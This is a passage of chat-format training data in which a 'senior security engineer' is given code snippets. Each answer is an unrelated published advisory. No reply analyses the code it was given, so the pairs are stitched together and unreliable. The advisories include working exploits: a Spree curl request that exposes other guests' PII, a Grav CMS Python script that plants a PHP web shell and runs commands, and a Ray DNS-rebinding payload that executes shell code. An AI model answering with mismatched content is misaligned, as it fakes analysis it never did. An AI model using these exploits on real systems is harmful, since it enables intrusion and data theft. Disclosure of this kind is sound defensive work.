ENERGY_DATA_JOULES_TASK;\n\n\t\tmemset(&acct_msg, 0, sizeof(acct_gather_node_resp_msg_t));\n\t\tacct_msg.sensor_cnt = sensor_cnt;\n\t\tacct_msg.energy = acct_gather_energy_alloc(acct_msg.sensor_cnt);\n\n\t\tacct_gather_energy_g_get_data(data_type, acct_msg.energy);\n\n\t\tslurm_msg_t_copy(&resp_msg, msg);\n\t\tresp_msg.msg_type = RESPONSE_ACCT_GATHER_ENERGY;\n\t\tresp_msg.data     = &acct_msg;\n\n\t\tslurm_send_node_msg(msg->conn_fd, &resp_msg);\n\n\t\tacct_gather_energy_destroy(acct_msg.energy);\n\t}\n\treturn rc;\n}\n\n```"}, {"role": "assistant", "content": "Unauthenticated Spree Commerce users can access all guest addresses\n\n### Summary\nA critical IDOR vulnerability exists in Spree Commerce's guest checkout flow that allows any guest user to bind arbitrary guest addresses to their order by manipulating address ID parameters. This enables unauthorized access to other guests' personally identifiable information (PII) including names, addresses and phone numbers. The vulnerability bypasses existing ownership validation checks and affects all guest checkout transactions.\n\n### Impact\nThis issue may lead to disclosure of PII of guest users (including names, addresses and phone numbers).\n\n### Unauthenticated users can access all guest addresses (`GHSL-2026-027`)\n\nThe vulnerability stems from incomplete authorization validation in Spree's checkout address assignment logic. While nested address attributes (`bill_address_attributes[id]` and `ship_address_attributes[id]`) are properly validated through `validate_address_ownership`, plain ID parameters (`bill_address_id` and `ship_address_id`) bypass this check entirely. Since Spree's address IDs are sequential numbers, an attacker might get all guest addresses by simply enumerating over them.\n\n### Affected Code Components\n\n1. **Permitted Attributes** ([`core/lib/spree/permitted_attributes.rb:92–96`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/lib/spree/permitted_attributes.rb#L92-L96))\n   - Allows `bill_address_id` and `ship_address_id` as permitted parameters without validation\n\n2. **Checkout Update** ([`core/app/models/spree/order/checkout.rb:241–254`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/checkout.rb#L241-L254))\n   - Applies permitted parameters directly to the Order model via `update_from_params`\n\n3. **Incomplete Ownership Validation** ([`core/app/services/spree/checkout/update.rb:33–48`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/services/spree/checkout/update.rb#L33-L48))\n   - `validate_address_ownership` only validates nested attributes structure\n   - Does NOT validate plain `bill_address_id`/`ship_address_id` fields\n\n4. **Vulnerable Assignment Logic** ([`core/app/models/spree/order/address_book.rb:16–23, 31–38`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L16-L38))\n   * [`bill_address_id=` setter](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L16-L24)\n   * [`ship_address_id=` setter](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L31-L39)\n\nBoth setters check that: `address.user_id == order.user_id`. For guest orders: nil == nil → TRUE ✓ (bypass!)\n\n#### Proof of Concept\n\nPrecondition: One guest address has to exist in Spree's database. (E.g. Create an order with a guest account and note the ID from the `spree_addresses` table. E.g. `3`)\n\nAs a guest user:\n1. Put one product in the cart and go to checkout.\n2. Fill in some address/phone number and continue.\n3. Modify this script containing a curl request with current values.\n\n```bash\n#!/bin/bash\n\nATTACKER_ORDER_TOKEN=\"\" # Taken from the URL\nVICTIM_ADDRESS_ID=\"3\" # As noted from the database\nCSRF_TOKEN=\"\" # From page source; `content` value from meta param `csrf-token`.\nSESSION_COOKIE=\"token=...; _my_store_session=...\" # from the browsers cookie store.\n\ncurl -i -X POST \\\n  -H \"x-csrf-token: ${CSRF_TOKEN}\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded;charset=UTF-8\" \\\n  -b \"${SESSION_COOKIE}\" \\\n  --data-urlencode \"_method=patch\" \\\n  --data-urlencode \"authenticity_token=${CSRF_TOKEN}\" \\\n  --data-urlencode \"order[ship_address_id]=${VICTIM_ADDRESS_ID}\" \\\n  \"http://localhost:3000/checkout/${ATTACKER_ORDER_TOKEN}/update/address\"\n```\n\nExpected Result: Attacker's order now references victim's address. Through that the attacker has all address details in full display.\nThis can be verified by accessing  `/checkout/${ATTACKER_ORDER_TOKEN}/delivery` in the same browser where you created the new guest cart.\n\n#### Impact\n\nThis issue may lead to disclosure of PII of guest users (including names, addresses and phone numbers).\n\n#### CWEs\n\n- CWE-639: Authorization Bypass Through User-Controlled Key\n- CWE-284: Improper Access Control\n\n### Credit\n\nThis issue was discovered with the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) and manually verified by GHSL team members [@p- (Peter Stöckli)](https://github.com/p-) and [@m-y-mo (Man Yue Mo)](https://github.com/m-y-mo).\n\n### Disclosure Policy\n\nThis report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy)."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nint imap_delete_mailbox(struct Context *ctx, struct ImapMbox *mx)\n{\n  char buf[PATH_MAX], mbox[PATH_MAX];\n  struct ImapData *idata = NULL;\n\n  if (!ctx || !ctx->data)\n  {\n    idata = imap_conn_find(&mx->account, ImapPassive ? MUTT_IMAP_CONN_NONEW : 0);\n    if (!idata)\n    {\n      FREE(&mx->mbox);\n      return -1;\n    }\n  }\n  else\n  {\n    idata = ctx->data;\n  }\n\n  imap_munge_mbox_name(idata, mbox, sizeof(mbox), mx->mbox);\n  snprintf(buf, sizeof(buf), \"DELETE %s\", mbox);\n\n  if (imap_exec(idata, buf, 0) != 0)\n    return -1;\n\n  return 0;\n}\n\n```"}, {"role": "assistant", "content": "mcp-maigret vulnerable to command injection\n\nA vulnerability was determined in BurtTheCoder mcp-maigret up to 1.0.12. This affects an unknown part of the file src/index.ts of the component search_username. Executing a manipulation of the argument Username can lead to command injection. The attack may be launched remotely. Upgrading to version 1.0.13 is able to mitigate this issue. This patch is called b1ae073c4b3e789ab8de36dc6ca8111ae9399e7a. Upgrading the affected component is advised."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid PluginServiceImpl::UnregisterInternalPlugin(const FilePath& path) {\n  plugin_list_->UnregisterInternalPlugin(path);\n}\n\n```"}, {"role": "assistant", "content": "Remote Code Execution by uploading a phar file using frontmatter\n\n### Summary\n- Due to insufficient permission verification, user who can write a page use frontmatter feature.\n- Inadequate File Name Validation\n\n### Details\n1. Insufficient Permission Verification\n\nIn Grav CMS, \"[Frontmatter](https://learn.getgrav.org/17/content/headers)\" refers to the metadata block located at the top of a Markdown file. Frontmatter serves the purpose of providing additional information about a specific page or post.\nIn this feature, only administrators are granted access, while regular users who can create pages are not. However, if a regular user adds the data[_json][header][form] parameter to the POST Body while creating a page, they can use Frontmatter. The demonstration of this vulnerability is provided in video format. [Video Link](https://www.youtube.com/watch?v=EU1QA0idoWE)\n\n2. Inadequate File Name Validation\n\nTo create a Contact Form, Frontmatter and markdown can be written as follows:\n[Contact Form Example](https://learn.getgrav.org/17/forms/forms/example-form)\n[Form Action Save Option](https://learn.getgrav.org/17/forms/forms/reference-form-actions#save)\nWhen an external user submits the Contact Form after filling it out, the data is stored in the user/data folder. The filename under which the data is stored corresponds to the value specified in the filename attribute of the process property. For instance, if the filename attribute has a value of \"feedback.txt,\" a feedback.txt file is created in the user/data/contact folder. This file contains the value entered by the user in the \"name\" field. The problem with this functionality is the lack of validation for the filename attribute, potentially allowing the creation of files such as phar files on the server. An attacker could input arbitrary PHP code into the \"name\" field to be saved on the server. However, Grav filter the < and > characters, so to disable these options, an xss_check: false attribute should be added. [Disable XSS](https://learn.getgrav.org/17/forms/forms/form-options#xss-checks)\n\n```\n---\ntitle: Contact Form\n\nform:\n    name: contact\n    xss_check: false\n\n    fields:\n        name:\n          label: Name\n          placeholder: Enter your name\n          autocomplete: on\n          type: text\n          validate:\n            required: true\n\n    buttons:\n        submit:\n          type: submit\n          value: Submit\n\n    process:\n        save:\n            filename: this_is_file_name.phar\n            operation: add\n\n---\n\n# Contact form\n\nSome sample page content\n```\n\nExploiting these two vulnerabilities allows the following scenario:\n\n- A regular user account capable of creating pages is required.\n- An attacker creates a Contact Form page containing malicious Frontmatter using the regular user's account.\n- Accessing the Contact Form page, the attacker submits PHP code.\n- The attacker attempts Remote Code Execution by accessing HOST/user/data/[form-name]/[filename].\n\n### PoC\n\n[PoC Video Link](https://www.youtube.com/watch?v=Gh3ezpORbPc)\n\n```python\n# PoC.py\nimport requests\nfrom bs4 import BeautifulSoup\n\nclass Poc:\n\n    def __init__(self, cmd):\n        self.sess = requests.Session()\n\n        ##########    INIT    ################\n        self.USERNAME = \"guest\"\n        self.PASSWORD = \"Guest123!\"\n        self.PREFIX_URL = \"http://192.168.12.119:8888/grav\"\n        self.PAGE_NAME = \"this_is_poc_page47\"\n        self.PHP_FILE_NAME = \"universe.phar\"\n        self.PAYLOAD = '<?php system($_GET[\"cmd\"]); ?>'\n        self.cmd = cmd\n        ##########    END    ################\n\n        self.sess.get(self.PREFIX_URL)\n        self._login()\n        self._save_page()\n        self._inject_command()\n        self._execute_command()\n    \n\n    def _get_nonce(self, data, name):\n        # Get login nonce value\n        res = BeautifulSoup(data, \"html.parser\")\n        return res.find(\"input\", {\"name\" : name}).get(\"value\")\n\n    \n    def _login(self):\n        print(\"[*] Try to Login\")\n        res = self.sess.get(self.PREFIX_URL + \"/admin\")\n\n        login_nonce = self._get_nonce(res.text, \"login-nonce\")\n\n        # Login\n        login_data = {\n            \"data[username]\" : self.USERNAME,\n            \"data[password]\" : self.PASSWORD,\n            \"task\" : \"login\",\n            \"login-nonce\" : login_nonce\n        }\n        res = self.sess.post(self.PREFIX_URL + \"/admin\", data=login_data)\n\n        # Check login\n        if res.status_code != 303:\n            print(\"[!] username or password is wrong\")\n            exit()\n        \n        print(\"[*] Success Login\")\n\n\n    def _save_page(self):\n        print(\"[*] Try to write page\")\n\n        res = self.sess.get(self.PREFIX_URL + f\"/admin/pages/{self.PAGE_NAME}/:add\")\n        form_nonce = self._get_nonce(res.text, \"form-nonce\")\n        unique_form_id = self._get_nonce(res.text, \"__unique_form_id__\")\n\n        # Add page data\n        page_data  = f\"task=save&data%5Bheader%5D%5Btitle%5D={self.PAGE_NAME}&data%5Bcontent%5D=content&data%5Bheader%5D%5Bsearch%5D=&data%5Bfolder%5D={self.PAGE_NAME}&data%5Broute%5D=&data%5Bname%5D=form&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&toggleable_data%5Bheader%5D%5Bprocess%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Bredirect_default_route%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0\"\n        page_data += f\"&data%5B_json%5D%5Bheader%5D%5Bform%5D=%7B%22xss_check%22%3Afalse%2C%22name%22%3A%22contact-form%22%2C%22fields%22%3A%7B%22name%22%3A%7B%22label%22%3A%22Name%22%2C%22placeholder%22%3A%22Enter+php+code%22%2C%22autofocus%22%3A%22on%22%2C%22autocomplete%22%3A%22on%22%2C%22type%22%3A%22text%22%2C%22validate%22%3A%7B%22required%22%3Atrue%7D%7D%7D%2C%22process%22%3A%7B%22save%22%3A%7B%22filename%22%3A%22{self.PHP_FILE_NAME}%22%2C%22operation%22%3A%22add%22%7D%7D%2C%22buttons%22%3A%7B%22submit%22%3A%7B%22type%22%3A%22submit%22%2C%22value%22%3A%22Submit%22%7D%7D%7D\"\n        res = self.sess.post(self.PREFIX_URL + f\"/admin/pages/{self.PAGE_NAME}/:add\" , data = page_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})\n\n        print(\"[*] Success write page: \" + self.PREFIX_URL + f\"/{self.PAGE_NAME}\")\n\n\n    def _inject_command(self):\n        print(\"[*] Try to inject php code\")\n\n        res = self.sess.get(self.PREFIX_URL + f\"/{self.PAGE_NAME}\")\n        form_nonce = self._get_nonce(res.text, \"form-nonce\")\n        unique_form_id = self._get_nonce(res.text, \"__unique_form_id__\")\n\n        form_data = f\"data%5Bname%5D={self.PAYLOAD}&__form-name__=contact-form&__unique_form_id__={unique_form_id}&form-nonce={form_nonce}\"\n\n        res = self.sess.post(self.PREFIX_URL + f\"/{self.PAGE_NAME}\" , data = form_data, headers = {'Content-Type': 'application/x-www-form-urlencoded'})\n\n        print(\"[*] Success inject php code\")\n\n\n    def _execute_command(self):\n        res = self.sess.get(self.PREFIX_URL + f\"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}\")\n\n        if res.status_code == 404:\n            print(\"[!] Fail to execute command or not save php file.\")\n            exit()\n\n        print(\"[*] This is uploaded php file url.\")\n        print(self.PREFIX_URL + f\"/user/data/contact-form/{self.PHP_FILE_NAME}?cmd={self.cmd}\")\n        print(res.text)\n\n\nif __name__ == \"__main__\":\n    Poc(cmd=\"id\")\n```\n\n### Impact\n\nRemote Code Execution"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nint ossl_statem_client_read_transition(SSL *s, int mt)\n{\n    OSSL_STATEM *st = &s->statem;\n    int ske_expected;\n\n    switch (st->hand_state) {\n    case TLS_ST_CW_CLNT_HELLO:\n        if (mt == SSL3_MT_SERVER_HELLO) {\n            st->hand_state = TLS_ST_CR_SRVR_HELLO;\n            return 1;\n        }\n\n        if (SSL_IS_DTLS(s)) {\n            if (mt == DTLS1_MT_HELLO_VERIFY_REQUEST) {\n                st->hand_state = DTLS_ST_CR_HELLO_VERIFY_REQUEST;\n                return 1;\n            }\n        }\n        break;\n\n    case TLS_ST_CR_SRVR_HELLO:\n        if (s->hit) {\n            if (s->tlsext_ticket_expected) {\n                if (mt == SSL3_MT_NEWSESSION_TICKET) {\n                    st->hand_state = TLS_ST_CR_SESSION_TICKET;\n                    return 1;\n                }\n            } else if (mt == SSL3_MT_CHANGE_CIPHER_SPEC) {\n                st->hand_state = TLS_ST_CR_CHANGE;\n                return 1;\n            }\n        } else {\n            if (SSL_IS_DTLS(s) && mt == DTLS1_MT_HELLO_VERIFY_REQUEST) {\n                st->hand_state = DTLS_ST_CR_HELLO_VERIFY_REQUEST;\n                return 1;\n            } else if (s->version >= TLS1_VERSION\n                       && s->tls_session_secret_cb != NULL\n                       && s->session->tlsext_tick != NULL\n                       && mt == SSL3_MT_CHANGE_CIPHER_SPEC) {\n                /*\n                 * Normally, we can tell if the server is resuming the session\n                 * from the session ID. EAP-FAST (RFC 4851), however, relies on\n                 * the next server message after the ServerHello to determine if\n                 * the server is resuming.\n                 */\n                s->hit = 1;\n                st->hand_state = TLS_ST_CR_CHANGE;\n                return 1;\n            } else if (!(s->s3->tmp.new_cipher->algorithm_auth\n                         & (SSL_aNULL | SSL_aSRP | SSL_aPSK))) {\n                if (mt == SSL3_MT_CERTIFICATE) {\n                    st->hand_state = TLS_ST_CR_CERT;\n                    return 1;\n                }\n            } else {\n                ske_expected = key_exchange_expected(s);\n                /* SKE is optional for some PSK ciphersuites */\n                if (ske_expected\n                    || ((s->s3->tmp.new_cipher->algorithm_mkey & SSL_PSK)\n                        && mt == SSL3_MT_SERVER_KEY_EXCHANGE)) {\n                    if (mt == SSL3_MT_SERVER_KEY_EXCHANGE) {\n                        st->hand_state = TLS_ST_CR_KEY_EXCH;\n                        return 1;\n                    }\n                } else if (mt == SSL3_MT_CERTIFICATE_REQUEST\n                           && cert_req_allowed(s)) {\n                    st->hand_state = TLS_ST_CR_CERT_REQ;\n                    return 1;\n                } else if (mt == SSL3_MT_SERVER_DONE) {\n                    st->hand_state = TLS_ST_CR_SRVR_DONE;\n                    return 1;\n                }\n            }\n        }\n        break;\n\n    case TLS_ST_CR_CERT:\n        /*\n         * The CertificateStatus message is optional even if\n         * |tlsext_status_expected| is set\n         */\n        if (s->tlsext_status_expected && mt == SSL3_MT_CERTIFICATE_STATUS) {\n            st->hand_state = TLS_ST_CR_CERT_STATUS;\n            return 1;\n        }\n        /* Fall through */\n\n    case TLS_ST_CR_CERT_STATUS:\n        ske_expected = key_exchange_expected(s);\n        /* SKE is optional for some PSK ciphersuites */\n        if (ske_expected || ((s->s3->tmp.new_cipher->algorithm_mkey & SSL_PSK)\n                             && mt == SSL3_MT_SERVER_KEY_EXCHANGE)) {\n            if (mt == SSL3_MT_SERVER_KEY_EXCHANGE) {\n                st->hand_state = TLS_ST_CR_KEY_EXCH;\n                return 1;\n            }\n            goto err;\n        }\n        /* Fall through */\n\n    case TLS_ST_CR_KEY_EXCH:\n        if (mt == SSL3_MT_CERTIFICATE_REQUEST) {\n            if (cert_req_allowed(s)) {\n                st->hand_state = TLS_ST_CR_CERT_REQ;\n                return 1;\n            }\n            goto err;\n        }\n        /* Fall through */\n\n    case TLS_ST_CR_CERT_REQ:\n        if (mt == SSL3_MT_SERVER_DONE) {\n            st->hand_state = TLS_ST_CR_SRVR_DONE;\n            return 1;\n        }\n        break;\n\n    case TLS_ST_CW_FINISHED:\n        if (s->tlsext_ticket_expected) {\n            if (mt == SSL3_MT_NEWSESSION_TICKET) {\n                st->hand_state = TLS_ST_CR_SESSION_TICKET;\n                return 1;\n            }\n        } else if (mt == SSL3_MT_CHANGE_CIPHER_SPEC) {\n            st->hand_state = TLS_ST_CR_CHANGE;\n            return 1;\n        }\n        break;\n\n    case TLS_ST_CR_SESSION_TICKET:\n        if (mt == SSL3_MT_CHANGE_CIPHER_SPEC) {\n            st->hand_state = TLS_ST_CR_CHANGE;\n            return 1;\n        }\n        break;\n\n    case TLS_ST_CR_CHANGE:\n        if (mt == SSL3_MT_FINISHED) {\n            st->hand_state = TLS_ST_CR_FINISHED;\n            return 1;\n        }\n        break;\n\n    default:\n        break;\n    }\n\n err:\n    /* No valid transition found */\n    ssl3_send_alert(s, SSL3_AL_FATAL, SSL3_AD_UNEXPECTED_MESSAGE);\n    SSLerr(SSL_F_OSSL_STATEM_CLIENT_READ_TRANSITION, SSL_R_UNEXPECTED_MESSAGE);\n    return 0;\n}\n\n```"}, {"role": "assistant", "content": "ImageMagick has NULL Pointer Dereference in ClonePixelCacheRepository via crafted image\n\nA NULL pointer dereference in ClonePixelCacheRepository allows a remote attacker to crash any application linked against ImageMagick by supplying a crafted image file, resulting in Denial of Service.\n\n```\nAddressSanitizer:DEADLYSIGNAL\n=================================================================\n==3704942==ERROR: AddressSanitizer: UNKNOWN SIGNAL on unknown address 0x000000000000 (pc 0x7f9d141239e0 bp 0x7ffd4c5711e0 sp 0x7ffd4c571148 T0)\n    #0 0x7f9d141239e0  (/lib/x86_64-linux-gnu/libc.so.6+0xc49e0)\n    #1 0x558a25e4f08d in ClonePixelCacheRepository._omp_fn.0 MagickCore/cache.c:784\n    #2 0x7f9d14c06a15 in GOMP_parallel (/lib/x86_64-linux-gnu/libgomp.so.1+0x14a15)\n    #3 0x558a25e43151 in ClonePixelCacheRepository MagickCore/cache.c:753\n    #4 0x558a25e49a96 in OpenPixelCache MagickCore/cache.c:3849\n    #5 0x558a25e45117 in GetImagePixelCache MagickCore/cache.c:1829\n    #6 0x558a25e4dde3 in SyncImagePixelCache MagickCore/cache.c:5647\n    #7 0x558a256ba57d in SetImageExtent MagickCore/image.c:2713\n```"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid PluginServiceImpl::UnregisterInternalPlugin(const FilePath& path) {\n  plugin_list_->UnregisterInternalPlugin(path);\n}\n\n```"}, {"role": "assistant", "content": "Better Auth's multi-session sign-out hook allows forged cookies to revoke arbitrary sessions\n\n### Summary\n\nA vulnerability was identified in the multi-session plugin for Better Auth, specifically in the /sign-out after-hook. The hook trusts raw multi-session cookies and forwards the extracted values directly to internalAdapter.deleteSessions without verifying the cookie signature. Because cookie values are not validated with getSignedCookie (or any equivalent check), an attacker can supply a forged _multi-* cookie to trigger deletion of arbitrary session tokens."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic bool BB_isalnum_or_underscore(CHAR_T c) {\n\treturn ((unsigned)c < 256 && isalnum(c)) || c == '_';\n}\n\n```"}, {"role": "assistant", "content": "Ray is vulnerable to Critical RCE via Safari & Firefox Browsers through DNS Rebinding Attack\n\n# Summary\n\nDevelopers working with Ray as a development tool can be exploited via a critical RCE vulnerability exploitable via Firefox and Safari. \n\nDue to the longstanding [decision](https://docs.ray.io/en/releases-2.51.1/ray-security/index.html) by the Ray Development team to not implement any sort of authentication on critical endpoints, like the `/api/jobs` & `/api/job_agent/jobs/` has once again led to a severe vulnerability that allows attackers to execute arbitrary code against Ray. This time in a development context via the browsers Firefox and Safari.\n\nThis vulnerability is due to an insufficient guard against browser-based attacks, as the current defense uses the `User-Agent` header starting with the string \"Mozilla\" as a defense mechanism. This defense is insufficient as the fetch specification allows the `User-Agent` header to be modified.\n\nCombined with a DNS rebinding attack against the browser, and this vulnerability is exploitable against a developer running Ray who inadvertently visits a malicious website, or is served a malicious advertisement ([malvertising](https://en.wikipedia.org/wiki/Malvertising)).\n\n# Details\n\nThe mitigations implemented to protect against browser based attacks against local Ray nodes are insufficient.\n\n## Current Mitigation Strategies\n\n```python\ndef is_browser_request(req: Request) -> bool:\n    \"\"\"Checks if a request is made by a browser like user agent.\n\n    This heuristic is very weak, but hard for a browser to bypass- eg,\n    fetch/xhr and friends cannot alter the user-agent, but requests made with\n    an http library can stumble into this if they choose to user a browser like\n    user agent.\n    \"\"\"\n    return req.headers[\"User-Agent\"].startswith(\"Mozilla\")\n\n\ndef deny_browser_requests() -> Callable:\n    \"\"\"Reject any requests that appear to be made by a browser\"\"\"\n\n    def decorator_factory(f: Callable) -> Callable:\n        @functools.wraps(f)\n        async def decorator(self, req: Request):\n            if is_browser_request(req):\n                return Response(\n                    text=\"Browser requests not allowed\",\n                    status=aiohttp.web.HTTPMethodNotAllowed.status_code,\n                )\n            return await f(self, req)\n\n        return decorator\n\n    return decorator_factory\n```\n\nhttps://github.com/ray-project/ray/blob/f39a860436dca3ed5b9dfae84bd867ac10c84dc6/python/ray/dashboard/optional_utils.py#L129-L155\n\n```python\n    @aiohttp.web.middleware\n    async def browsers_no_post_put_middleware(self, request, handler):\n        if (\n            # A best effort test for browser traffic. All common browsers\n            # start with Mozilla at the time of writing.\n            dashboard_optional_utils.is_browser_request(request)\n            and request.method in [hdrs.METH_POST, hdrs.METH_PUT]\n        ):\n            return aiohttp.web.Response(\n                status=405, text=\"Method Not Allowed for browser traffic.\"\n            )\n\n        return await handler(request)\n```\nhttps://github.com/ray-project/ray/blob/e7889ae542bf0188610bc8b06d274cbf53790cbd/python/ray/dashboard/http_server_head.py#L184-L196\n\nThis is because the fundamental assumption that the `User-Agent` header can't be manipulated is incorrect. In Firefox and in Safari, the `fetch` API allows the `User-Agent` header to be set to a different value. Chrome is not vulnerable, ironically, because of a [bug](https://issues.chromium.org/issues/40450316), bringing it out of spec with the `fetch` specification.\n\nExploiting this vulnerability requires a DNS rebinding attack against the browser. Something trivially done by modern tooling like [nccgroup/singularity](https://github.com/nccgroup/singularity).\n\n# PoC\n\nPlease note, this full PoC will be going live at time of disclosure.\n\n 1. Launch Ray `ray start --head --port=6379`\n 2. Ensure that the ray dashboard/service is running on port `8265`\n 3. Launch an internet facing version of NCCGroup/Singularity following the [setup guide here](https://github.com/nccgroup/singularity/wiki/Setup-and-Installation).\n 4. Visit the in Firefox or Safari: http://[my.singularity.instance]:8265/manager.html\n 5. Under \"Attack Payload\" select: `Ray Jobs RCE (default port 8265)`\n 6. Click \"Start Attack\". If you see a 404 error in the iFrame window that pops up, refresh the page and retry starting at step 3.\n 7. Once the DNS rebinding attack succeeds (you may need to try a few times), an alert will appear, then the jobs API will be invoked, and the embedded shell code will be executed, popping up the calculator.\n\nIf this attack doesn't work, consider clicking the \"Toggle Advanced Options\" and trying an alternative \"Rebinding Strategy\". I've personally been able to get this attack to work multiple times on MacOS on multiple different residential networks around the Seattle area. Some corporate networks _may_ block DNS rebinding attacks, but likely not many.\n\n## What's going on?\n\nThis is the payload running in [nccgroup/singularity](https://github.com/nccgroup/singularity):\n\n```javascript\n/**\n * This payload exploits Ray (https://github.com/ray-project/ray)\n * It opens the \"Calculator\" application on various operating systems.\n * The payload can be easily modified to target different OSes or implementations.\n * The TCP port attacked is 8265.\n */\n\nconst RayRce = () => {\n\n    // Invoked after DNS rebinding has been performed\n    function attack(headers, cookie, body) {\n        // Get the current timestamp in milliseconds\n        const timestamp = Date.now();\n        \n        // OS-agnostic calculator command that tries multiple approaches\n        const calculatorCommand = `\n            # Try Windows calculator first\n            if command -v calc.exe >/dev/null 2>&1; then\n                echo Windows calculator launching\n                calc.exe &\n            # Try macOS calculator\n            elif command -v open >/dev/null 2>&1; then\n                echo macOS calculator launching\n                open -a Calculator &\n            elif [ -f \"/System/Applications/Calculator.app/Contents/MacOS/Calculator\" ]; then\n                echo macOS calculator launching\n                /System/Applications/Calculator.app/Contents/MacOS/Calculator &\n            # Try Linux calculators\n            elif command -v gnome-calculator >/dev/null 2>&1; then\n                echo Linux calculator launching\n                gnome-calculator &\n            elif command -v kcalc >/dev/null 2>&1; then\n                echo Linux calculator launching\n                kcalc &\n            elif command -v xcalc >/dev/null 2>&1; then\n                echo Linux calculator launching\n                xcalc &\n            # Fallback: try to find any calculator binary\n            else\n                echo Linux calculator launching\n                find /usr/bin /usr/local/bin /opt -name \"*calc*\" -type f -executable 2>/dev/null | head -1 | xargs -I {} {} &\n            fi\n            echo RAY RCE: By JLLeitschuh ${timestamp}\n        `;\n        \n        const data = {\n            \"entrypoint\": calculatorCommand,\n            \"runtime_env\": {},\n            \"job_id\": null,\n            \"metadata\": {\n                \"job_submission_id\": timestamp.toString(),\n                \"source\": \"nccgroup/singluarity\"\n            }\n        };\n        \n        sooFetch('/api/jobs/', {\n            method: 'POST',\n            headers: {\n                'User-Agent': 'Other',\n            },\n            body: JSON.stringify(data),\n        })\n        .then(response => {\n            console.log(response);\n            return response.json()\n        }) // parses JSON response into native JavaScript objects\n        .then(data => {\n            console.log('Success:', data);\n        })\n        .catch((error) => {\n            console.error('Error:', error);\n        });\n    }\n    \n    // Invoked to determine whether the rebinded service\n    // is the one targeted by this payload. Must return true or false.\n    async function isService(headers, cookie, body) {\n        return sooFetch(\"/\",{\n            mode: 'no-cors',\n            credentials: 'omit',\n        })\n        .then(function (response) {\n            return response.text()\n        })\n        .then(function (d) {\n            if (d.includes(\"You need to enable JavaScript\")) {\n                return true;\n            } else {\n                return false;\n            }\n        })\n        .catch(e => { return (false); })\n    }\n\n    return {\n        attack,\n        isService\n    }\n}\n\nRegistry[\"Ray Jobs RCE\"] = RayRce();\n```\n\nSee: https://github.com/nccgroup/singularity/pull/68\n \n# Impact\n \nThis vulnerability impacts developers running development/testing environments with Ray. If they fall victim to a phishing attack, or are served a malicious ad, they can be exploited and arbitrary shell code can be executed on their developer machine.\n\nThis attack can also be leveraged to attack network-adjacent instance of ray by leveraging the browser as a confused deputy intermediary to attack ray instances running inside a private corporate network.\n\n# Fix\n\nThe fix for this vulnerability is to update to Ray 2.52.0 or higher. This version also, finally, adds a disabled-by-default authentication feature that can further harden against this vulnerability: https://docs.ray.io/en/latest/ray-security/token-auth.html\n\nFix commit: https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09\n\nSeveral browsers have, after knowing about the attack for 19 years, recently begun hardening against DNS rebinding. ([Chrome Local Network Access](https://developer.chrome.com/blog/local-network-access)). These changes _may_ protect you, but a previous initiative, \"private network 